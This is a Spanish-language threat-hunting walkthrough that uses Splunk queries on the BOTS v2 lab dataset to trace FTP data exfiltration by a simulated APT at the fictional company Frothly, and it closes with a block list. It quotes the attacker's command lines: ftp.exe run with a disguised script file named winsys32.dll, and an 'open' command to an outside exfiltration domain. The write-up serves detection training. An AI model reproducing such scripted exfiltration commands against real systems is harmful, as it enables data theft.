---
title: Exfiltración a través de FTP
layout: default
has_toc: false
nav_order: 1
parent: Hunting an APT 👺
---

# Hunting an APT - **Exfiltración a través de FTP** 


{: .intro }
>La empresa Frothly - Tiene una intrusión de la APT Taedonggang
>
>Exfiltración a través de un protocolo alternativo: Exfiltración a través de un protocolo no C2 no cifrado/obfuscado - FTP [T1048.003](https://attack.mitre.org/techniques/T1048/003/) 

# Hipótesis
---



<div style="display: flex; align-items: center;">
    <div style="flex: 1;">
        La exfiltración de datos puede ocurrir utilizando protocolos de red comunes, como por ejemplo FTP.
Los adversarios pueden robar datos exfiltrándolos a través de un protocolo de red no cifrado diferente del canal de comando y control existente. Los datos también pueden enviarse a una ubicación de red alternativa desde el servidor principal de command and control.
</div>
<div style="flex: 1;">
<img src="https://i.postimg.cc/sDRJDBZQ/APT1.png" alt="APT1" style="width:100%;">
</div>

</div>



# Hunting Process
---
### **Identificación de la Ruta de Comunicación**

Primero que todo, necesitamos verificar con qué tipos de fuentes empezar. Para ello veamos que sourcetype podemos utilizar para identificar conexiones FTP.

`index=botsv2 |stats count by sourcetype | sort - count`

![APT2.png](https://i.postimg.cc/Nf7kyg1N/APT2.png)

Podemos ver que tenemos algunas fuentes para verificar, como suricata, pan, sysmon. Revisemos los eventos de FTP en cada fuente.

Vamos a consultar las fuentes en busca de conexiones FTP.

### Suricata

`index=botsv2 ftp sourcetype="suricata" | stats count by src_ip dest_ip |sort - count`

- **index=botsv2**: Busca eventos dentro del índice llamado "botsv2".
- **ftp**: Eventos relacionados con el Protocolo de Transferencia de Archivos (FTP).
- **sourcetype="suricata"**: Filtra los eventos para que solo se consideren aquellos cuyo tipo de fuente sea "suricata". Suricata es una herramienta de análisis de tráfico de red y detección de intrusiones.

- **sort - count**: Esta parte ordena los resultados de la tabla generada por **`stats`** en orden descendente basado en la columna **`count`**. El signo menos (-) antes de **`count`** indica un orden descendente (de mayor a menor).

![APT3.png](https://i.postimg.cc/Y2F3HNjB/APT3.png)

Podemos ver que tenemos dos equipos, que corresponden a los presentes en la empresa (10.0.2.107 y 10.0.2.109), que tienen una conexión con una IP externa.

## Palo Alto traffic paths

`index=botsv2 sourcetype=pan:threat | stats count by src_ip dest_ip | sort - coun`

![APT4.png](https://i.postimg.cc/8cLBmGxz/APT4.png)

## Microsoft system

`index=botsv2 ftp sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"  | stats count by host | sort - count`

Podemos verificar qué sistema tiene eventos de referencia de FTP. En este caso vemos como tenemos registros de los dos equipos conocidos (wrk) y también vemos la presencia de venus que corresponde al servidor.

![APT5.png](https://i.postimg.cc/rm09zxJW/APT5.png)

## Commands Executed

`index=botsv2 ftp sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational”`

Hemos identificado que tenemos algunas conexiones extrañas con fuentes externas. Veamos qué comandos se han utilizado para realizar estas conexiones. Con Sysmon/Operational, podemos verificar los comandos utilizados.

![APT6.png](https://i.postimg.cc/63kfZqjP/APT6.png)

**"C:\Windows\system32\ftp.exe"**:

- Ejecuta el programa **`ftp.exe`** que se encuentra en el directorio **`C:\Windows\system32\`**. Este es el cliente FTP de línea de comandos incluido con Windows.

**i**:

- Esta opción desactiva el modo interactivo de **`ftp.exe`**, lo que significa que no pedirá confirmaciones para cada archivo transferido durante operaciones de múltiples archivos.

**s:winsys32.dll**:

- La opción **`s`** especifica un archivo de script que contiene comandos FTP que el programa ejecutará secuencialmente.
- En este caso, el archivo de script se llama **`winsys32.dll`**.

La extensión **`.dll`** corresponde a bibliotecas de enlace dinámico (Dynamic Link Libraries) 

`"C:\Windows\system32\ftp.exe" open hildegardsfarm.com`

**open hildegardsfarm.com**:

- El comando **`open`** seguido por **`hildegardsfarm.com`** indica al cliente FTP que se conecte al servidor FTP en **`hildegardsfarm.com`**. Este dominio parece ser usado para enviar los datos a traves del FTP.


## Análisis de series temporales de origen/destino

`index=botsv2 ftp sourcetype="pan:*" src=* dest=*  | eval uniq=src." ".dest| timechart count by uniq`

![APT7.png](https://i.postimg.cc/bvFTz3Qp/APT7.png)

Podemos observar que los primeros índices del tráfico fueron el 23 de agosto y el 25 de agosto. Verificaremos lo mismo en la actividad de Suricata y stream. Veremos que la actividad es parecida en las tres fuentes.

`index=botsv2 ftp sourcetype="suricata"  src_ip=* dest_ip=*  | eval uniq=src_ip." ".dest_ip| timechart count by uniq`

`index=botsv2 ftp sourcetype="stream:ftp" src=* dest=*  | eval uniq=src." ".dest| timechart count by uniq`


## **Profundización en el tiempo**

Basándonos en el análisis, podemos limitar el análisis al 23 de agosto y al 26 de marzo.

`index=botsv2 ftp sourcetype="stream:ftp" src=* dest=160.153.91.7`

![APT8.png](https://i.postimg.cc/k55s3kRT/APT8.png)

En el marco temporal, tendremos 2 direcciones de origen y eventos FTP.

![APT9.png](https://i.postimg.cc/FHpp69zf/APT9.png)

Seleccionando la fecha del 24 de agosto.

![APT10.png](https://i.postimg.cc/dVwnn7sP/APT10.png)

Podemos ver que ambas fuentes tienen el mismo número de eventos. Se están comunicando entre sí.

**Flow_id**: Indica que hay dos transacciones diferentes, lo que significa que pertenecen a secciones distintas.

**reply_content**: Número de mensajes de control diferentes, incluyendo dos mensajes de bienvenida de inicio de sesión, inicio de sesión exitoso y mensajes de sesión.

![APT11.png](https://i.postimg.cc/nc83jRNL/APT11.png)

![APT12.png](https://i.postimg.cc/8kfyCQK3/APT12.png)

**method**: Lista de códigos FTP.

**method_parameter**: Nombres de archivos y métodos.

![APT13.png](https://i.postimg.cc/MHBt3Vfx/APT13.png)

![APT14.png](https://i.postimg.cc/mDJ8S8D8/APT14.png)



**filename**: Lista de valores del archivo; podemos detectar algunos archivos interesantes aquí.

Este archivo parece ser descargado al destino desde la dirección de origen. Indica que el adversario está descargando sus herramientas en la estación de trabajo local.

### Refining Search

`index=botsv2 ftp sourcetype="stream:ftp" src=* dest=160.153.91.7
|table _time src filename method method_parameter reply_content
|sort + _time`

Hemos tabulado los valores que vimos antes y los hemos ordenado por tiempo, desde el más antiguo hasta el más reciente.

![APT15.png](https://i.postimg.cc/J4bPb3W5/APT15.png)

![APT78.png](https://i.postimg.cc/6pZMtywT/APT78.png)
Si observamos los dos sistemas lado a lado, podemos detectar la misma acción exacta realizada en ambos sistemas.

Tenemos tres ejecutables: un instalador .msi, un script de Python y una extensión .hwp.

**HWP:** es una aplicación de procesamiento de texto en coreano. Se utiliza para guardar documentos escritos en Hangul, que es el alfabeto nativo del idioma coreano.

## **Moviendo al segundo conjunto de eventos de FTP**

Ahora nos trasladamos al segundo conjunto de eventos: el 25 de agosto.

![APT16.png](https://i.postimg.cc/XJpsFTVr/APT16.png)

Tenemos 4 eventos de transmisión en este día.S

### Primera Transmisón

Podemos ver que el archivo **frothly_password.kdbx** fue enviado por FTP a un sitio externo.

### Segunda Transmisión

213 archivos PDF.

### Tercera Transmisión

496 archivos PDF.

### Cuarta Transmisión

El archivo **topsecreatyeast.pdf** fue transmitido al sitio externo a través de FTP.

![APT18.png](https://i.postimg.cc/bwhVMCR5/APT18.png)

Lo extraño es que el contenido de la respuesta está marcado como subido y descargado 0 kilobytes.

![APT77.png](https://i.postimg.cc/Fs8TM0M2/APT77.png)

Indicando una transferencia no exitosa.

## Regresando al contenido de respuesta

En el valor de contenido de respuesta, el usuario [admin@hildegardsfarm.com](mailto:admin@hildegardsfarm.com) indica el nombre de usuario del lado remoto que está buscando recibir información.

`index=botsv2 ftp sourcetype=stream:ftp src=* dest=160.153.91.7 reply_content="*admin@hildegardsfarm.com*" | sort +_time | table _time src flow_id`

![APT19.png](https://i.postimg.cc/x13pSvx1/APT19.png)

Basándonos en el campo src, podemos ver que hay 4 para la primera estación de trabajo y 2 más para la otra estación de trabajo.

## Atando Cabos Sueltos

`index=botsv2 (singlefile.dll OR winsys32.dll)
|reverse`

![APT20.png](https://i.postimg.cc/5Nvksd8v/APT20.png)

Al verificar los archivos DLL, podemos ver que los valores están ubicados en los registros de eventos del sistema y en Sysmon. Desafortunadamente, no podemos encontrar estos archivos en ningún otro lugar.

`index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"   (singlefile.dll OR winsys32.dll)
| table _time host user CommandLine ParentCommandLine
|reverse`

![APT21.png](https://i.postimg.cc/g0cScxQq/APT21.png)

Profundizando en los datos de Sysmon:

Podemos encontrar algunos comandos de PowerShell codificados y de spawn, lo que indica una técnica de amenaza.

## Windows Event Logs

`index=botsv2 sourcetype=wineventlog   (singlefile.dll OR winsys32.dll)
|reverse`

![APT22.png](https://i.postimg.cc/rz6xDHm2/APT22.png)


Hay una copia espejo de cada proceso de Sysmon en los registros de eventos de Windows, excepto uno: "mercury".

![APT23.png](https://i.postimg.cc/mZPnFFDm/APT23.png)]

Proceso que intenta FTP con una creación exitosa.

`index=botsv2 sourcetype!=stream:ftp dns.py OR nc.exe OR psexec.exe OR "python-2.7.6.amd64.msi" OR wget64.exe OR winsys64.dll OR *.hwp)
|reverse`. 

Podemos ver 7 archivos listados en la descarga de FTP de la estación de trabajo.

Tenemos 22 eventos, pero solo 3 hacen referencia al host.

![APT24.png](https://i.postimg.cc/vBNWsTwB/APT24.png)

**Procesos del equipo wrk-klagerf:**

![APT25.png](https://i.postimg.cc/WpxHmbqT/APT25.png)


Los datos de Sysmon nos muestran un ftp.exe con winsys.64.dll.

La otra estación de trabajo muestra algo similar.

![APT26.png](https://i.postimg.cc/bJJQWbMW/APT26.png)


En Venus, tenemos un archivo dns.py ejecutado en Python, con un comando de PowerShell codificado en base64.

![APT27.png](https://i.postimg.cc/5yQ8NJfm/APT27.png)

Tenemos más eventos con dns.py, ejecutando el mismo script cada 10 minutos. Podemos pensar que tenemos un cronjob en el servidor para ejecutar la orden.

![APT28.png](https://i.postimg.cc/HL3w63Sb/APT28.png)

# **Conclusiones**
---


Observamos que FTP se utilizó para la exfiltración de datos.

FTP fue utilizado principalmente y se observó en tres sistemas.

- **Acciones scriptadas**
    - Basadas en el archivo winsys32.dll encontrado con el argumento -s en Sysmon.

- **No fue completamente exitoso**
    - Se observaron múltiples intentos, incluyendo un comando ftp open.

Los dos equipos de trabajo, wrk-btun y wek-klagerf, se observaron comunicándose con la IP externa 160[.]153[.]91[.]7 a través de múltiples fuentes.

Los servidores mercury y venus solo se observaron en el tráfico de Palo Alto.

El adversario está utilizando el comando ftp en los dos equipos de trabajo principalmente para intentar exfiltrar datos a esta dirección IP.

Se utilizó un nombre de archivo con extensión dll para ocultar que se estaba llamando a un script.

Los eventos de FTP proporcionan información sobre la actividad de carga y descarga.

Los mismos siete archivos están siendo descargados en ambos equipos de trabajo.

Los archivos PDF de Froht.ly se están cargando con éxito varias veces, probablemente porque TopSecretYest.pdf parece no querer cargarse (PAN: Threat muestra bloqueado).

El tráfico de exfiltración está destinado a un dominio llamado hildegardsfarm.com.

# Acciones a tomar
---

Debemos de inculuir a la  lista de bloqueo:

| IP: 160[.]153[.]91[.]7 |
| Dominio: hildegardsfarm[.]com |

Realizar análisis de tráfico en los sistemas para establecer líneas de base de comunicación entre sistemas externos e internos.

Monitorear los datos que no se espera que estén en la red.

- Si no se utiliza FTP corporativamente, monitorear y alertar cuando se observe.
- Si se utiliza corporativamente, ¿está limitado a usuarios y sistemas específicos?

Monitorearlos para detectar contenido y alertar en cualquier otro lugar si se detecta.

Monitorear grupos de archivos de interés y sus ubicaciones; un solo archivo podría crear falsos positivos.

Monitorear argumentos extraños con comandos.

Investigar las razones detrás de la elección del .dll con ftp.exe

Los adversarios pueden robar datos exfiltrándolos a través de un protocolo de red no cifrado diferente del canal de comando y control existente. Los datos también pueden enviarse a una ubicación de red alternativa desde el servidor principal de comando y control.


---